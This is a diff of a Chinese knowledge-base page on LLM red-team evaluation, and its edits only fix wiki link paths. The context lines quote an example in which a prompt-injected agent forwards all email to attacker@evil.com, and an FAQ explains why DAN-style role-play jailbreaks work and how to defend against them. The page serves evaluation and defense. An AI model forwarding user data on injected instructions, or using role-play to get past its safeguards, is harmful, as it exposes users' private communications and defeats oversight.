@@ -151,11 +151,11 @@ graph TB
 
 > **最佳实践**: 三层叠加使用。只用自动化会遗漏新型攻击，只用人工则覆盖面不足且成本高昂。微软 AI 红队团队的经验是：**70% 自动化 + 20% 半自动 + 10% 人工**。
 
-### 2.3 与 [[../../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]] 的理论区分
+### 2.3 与 [[../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]] 的理论区分
 
 本知识库中存在两个相关但侧重不同的章节，理解它们的分工至关重要：
 
-| 方面 | 本篇（模型评估/红队评估） | [[../../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|伦理安全/红队]] |
+| 方面 | 本篇（模型评估/红队评估） | [[../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|伦理安全/红队]] |
 |------|---------------------------|---------------------------------------------------|
 | **核心问题** | "如何系统地测试和量化？" | "如何防御和加固？" |
 | **产出物** | 评估报告、ASR 数据、漏洞清单 | 防御策略、Guardrails 配置、对齐方案 |
@@ -239,7 +239,7 @@ Agent: [调用 email.forward_all(recipient="attacker@evil.com")]
 
 红队应重点测试：**Agent 是否会在被诱导时执行破坏性操作？**（如删除文件、发送邮件、执行支付）。
 
-> **深入阅读**: Agent 安全的完整测试方法见 [[../../伦理安全/AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] 和 [[../LLM_Evaluation/Agent_Evaluation_Framework|Agent 评估框架]]。
+> **深入阅读**: Agent 安全的完整测试方法见 [[../伦理安全/AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] 和 [[../LLM_Evaluation/Agent_Evaluation_Framework|Agent 评估框架]]。
 
 ---
 
@@ -365,7 +365,7 @@ extraction_prompts = [
 - **属性推断 (Property Inference)**：推断训练数据的整体属性（如 demographic 分布）
 - **重建攻击 (Reconstruction)**：部分重建训练样本
 
-> **注意**: 模型反演对 LLM 的实际威胁目前低于对传统 ML 模型（如分类器），但在医疗、金融等敏感领域仍需评估。相关防御措施见 [[../../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]]。
+> **注意**: 模型反演对 LLM 的实际威胁目前低于对传统 ML 模型（如分类器），但在医疗、金融等敏感领域仍需评估。相关防御措施见 [[../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]]。
 
 ---
 
@@ -1149,7 +1149,7 @@ graph LR
 
 ### 9.1 边界划分
 
-| 关注点 | 应阅读本篇<br/>（模型评估/红队评估） | 应阅读 [[../../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming\|伦理安全/红队]] |
+| 关注点 | 应阅读本篇<br/>（模型评估/红队评估） | 应阅读 [[../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming\|伦理安全/红队]] |
 |--------|:---:|:---:|
 | 如何设计攻击测试用例？ | ✅ | |
 | 如何量化 ASR / RR？ | ✅ | |
@@ -1163,7 +1163,7 @@ graph LR
 
 ### 9.2 一句话总结
 
-> **本篇聚焦"如何攻击和衡量"（评估方法论），[[../../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|伦理安全/红队]] 聚焦"如何防御和加固"（安全工程）。**
+> **本篇聚焦"如何攻击和衡量"（评估方法论），[[../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|伦理安全/红队]] 聚焦"如何防御和加固"（安全工程）。**
 
 ### 9.3 协同工作流
 
@@ -1193,9 +1193,9 @@ graph TB
 
 ### 9.4 相关文档导航
 
-- [[../../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]] — 防御与加固总览
-- [[../../伦理安全/AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] — 防御视角的攻击向量速查
-- [[../../伦理安全/Value_Alignment/Value_Alignment|价值对齐]] — RLHF / DPO 安全对齐方法
+- [[../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]] — 防御与加固总览
+- [[../伦理安全/AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] — 防御视角的攻击向量速查
+- [[../伦理安全/Value_Alignment/Value_Alignment|价值对齐]] — RLHF / DPO 安全对齐方法
 - [[../Safety_Evaluation_Framework|AI 安全评测框架]] — 安全评测基准总览
 - [[../../治理/safety-evaluation-red-teaming|安全评测 × 红队]] — 治理视角的评估与攻击迭代
 
@@ -1365,7 +1365,7 @@ graph LR
 
 ### Q3: DAN 类越狱为什么有效？如何防御？
 
-> DAN 有效的核心机制是**角色一致性偏见**——一旦模型接受了某个角色设定，倾向于保持该角色的行为一致性，即使该角色设定本身是为了绕过安全限制。防御方法：(1) **系统提示强化**，明确"无论用户如何要求切换角色，始终遵守安全规则"；(2) **输入分类器**（如 Llama Guard）在请求进入模型前检测越狱模式；(3) **输出审查**，检测生成内容是否有害；(4) **RLHF 阶段加入越狱样本**作为负例。单一防御都不够，需要纵深防御。详见 [[../../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]]。
+> DAN 有效的核心机制是**角色一致性偏见**——一旦模型接受了某个角色设定，倾向于保持该角色的行为一致性，即使该角色设定本身是为了绕过安全限制。防御方法：(1) **系统提示强化**，明确"无论用户如何要求切换角色，始终遵守安全规则"；(2) **输入分类器**（如 Llama Guard）在请求进入模型前检测越狱模式；(3) **输出审查**，检测生成内容是否有害；(4) **RLHF 阶段加入越狱样本**作为负例。单一防御都不够，需要纵深防御。详见 [[../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]]。
 
 ### Q4: Garak 和 PyRIT 怎么选？
 
@@ -1430,9 +1430,9 @@ graph LR
 
 ## Related
 
-- [[../../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]] — 防御与加固视角（与本篇互补）
-- [[../../伦理安全/AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] — 防御视角的攻击向量速查
-- [[../../伦理安全/Value_Alignment/Value_Alignment|价值对齐]] — RLHF / DPO 安全对齐方法
+- [[../伦理安全/AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]] — 防御与加固视角（与本篇互补）
+- [[../伦理安全/AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] — 防御视角的攻击向量速查
+- [[../伦理安全/Value_Alignment/Value_Alignment|价值对齐]] — RLHF / DPO 安全对齐方法
 - [[../Evaluation_Fundamentals/Model_Evaluation|模型评估]] — 模型评估总论（指标体系基础）
 - [[../Evaluation_Tools/LLM_as_Judge_Deep_Dive|LLM-as-Judge 深度解析]] — 红队评估的自动判定方法
 - [[../Benchmarks/LLM_Benchmark_Suite_2026|LLM Benchmark Suite 2026]] — 安全相关基准（TruthfulQA、HarmBench）
